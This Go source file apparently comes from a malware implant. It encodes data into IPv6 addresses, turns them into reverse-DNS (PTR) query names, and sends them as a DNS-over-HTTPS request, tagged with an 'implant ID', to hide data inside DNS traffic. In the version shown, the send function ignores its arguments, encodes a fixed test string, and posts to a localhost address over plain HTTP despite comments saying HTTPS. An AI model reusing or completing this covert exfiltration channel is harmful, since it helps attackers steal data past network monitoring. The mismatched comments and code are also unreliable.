package shared

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strings"
)

// StringToIPv6List converts a string to a list of IPv6 addresses.
func StringToIPv6List(input string) []string {
	// Convert the input string to its hexadecimal representation
	hexStr := hex.EncodeToString([]byte(input))

	// Pad the hex string to make its length a multiple of 32 characters (16 bytes)
	if len(hexStr)%32 != 0 {
		padding := 32 - len(hexStr)%32
		hexStr += strings.Repeat("0", padding)
	}

	// Split the hex string into 32-character chunks, each forming an IPv6 address
	var ipv6Addresses []string
	for i := 0; i < len(hexStr); i += 32 {
		chunk := hexStr[i : i+32]

		// Format the chunk into an IPv6 address with 8 groups of 4 hex digits
		ipv6 := fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s",
			chunk[0:4], chunk[4:8], chunk[8:12], chunk[12:16],
			chunk[16:20], chunk[20:24], chunk[24:28], chunk[28:32])

		ipv6Addresses = append(ipv6Addresses, ipv6)
	}

	return ipv6Addresses
}

// Ipv6ToPTR converts an IPv6 address to its reverse DNS (PTR) format.
func Ipv6ToPTR(ipv6 string) string {
	// Remove colons and expand zeros to ensure 32 hexadecimal characters
	ipv6 = strings.ReplaceAll(ipv6, ":", "")
	if len(ipv6) < 32 {
		ipv6 = fmt.Sprintf("%032s", ipv6)
	}

	// Reverse the hex characters and append ".ip6.arpa."
	var reversedHex []string
	for i := len(ipv6) - 1; i >= 0; i-- {
		reversedHex = append(reversedHex, string(ipv6[i]))
	}
	return strings.Join(reversedHex, ".") + ".ip6.arpa"
}

// SendPTRRequest sends a PTR request to the target server
// Takes in an IP and ID
// The IP is the encoded data and the ID should be the implant ID hex encoded
// SendPTRRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
func SendPTRRequest(impId string, ipv6List []string) bool {

	ipFormData := StringToIPv6List("7465:7374::")
	ptrDomain := formatPTR(ipFormData)

	// Build the DNS packet
	var dnsPacket bytes.Buffer
	ptrRCount := uint16(len(ptrDomain))

	// Header
	header := struct {
		ID      uint16
		Flags   uint16
		QDCount uint16
		ANCount uint16
		NSCount uint16
		ARCount uint16
	}{
		ID:      0x04d2,    // 1234 in hex
		Flags:   0x0100,    // Standard recursive query
		QDCount: ptrRCount, // 1 question
	}
	binary.Write(&dnsPacket, binary.BigEndian, header)

	// Question section: Encode domain name
	for _, domain := range ptrDomain {
		labels := strings.Split(domain, ".")
		for _, label := range labels {
			dnsPacket.WriteByte(byte(len(label)))
			dnsPacket.WriteString(label)
		}
		dnsPacket.WriteByte(0) // End of domain name

		// Type and Class
		question := struct {
			Type  uint16
			Class uint16
		}{
			Type:  12, // PTR
			Class: 1,  // IN
		}
		binary.Write(&dnsPacket, binary.BigEndian, question)
	}

	// Send the packet over HTTPS
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{}}}
	req, err := http.NewRequest("POST", "http://127.0.0.1:5000/dns-query", &dnsPacket)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}
	req.Header.Set("Content-Type", "application/dns-message")

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making DoH request:", err)
		return false
	}
	defer resp.Body.Close()

	// Read and display the response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return false
	}
	fmt.Printf("Raw DoH Response: %x\n", body)

	return true
}

// Helper function to format PTR domains
// Input a list of IPs
// Returns a list of PTR formatted records
func formatPTR(ipLs []string) []string {
	var domains []string
	for _, ip := range ipLs {
		// Expand the IPv6 address to its full representation
		expandedIP := expandIPv6(ip)

		// Remove colons and reverse the characters
		reversed := []rune{}
		for _, char := range expandedIP {
			if char != ':' {
				reversed = append([]rune{char}, reversed...)
			}
		}

		// Join the reversed characters with dots and append ".ip6.arpa"
		domain := fmt.Sprintf("%s.ip6.arpa", strings.Join(strings.Split(string(reversed), ""), "."))
		domains = append(domains, domain)
	}
	return domains
}

func expandIPv6(ip string) string {
	// Expands an IPv6 address to its full form
	parts := strings.Split(ip, ":")
	var fullParts []string
	for _, part := range parts {
		// Expand each part to 4 digits
		fullParts = append(fullParts, fmt.Sprintf("%04s", part))
	}

	// Join expanded parts
	return strings.Join(fullParts, ":")
}
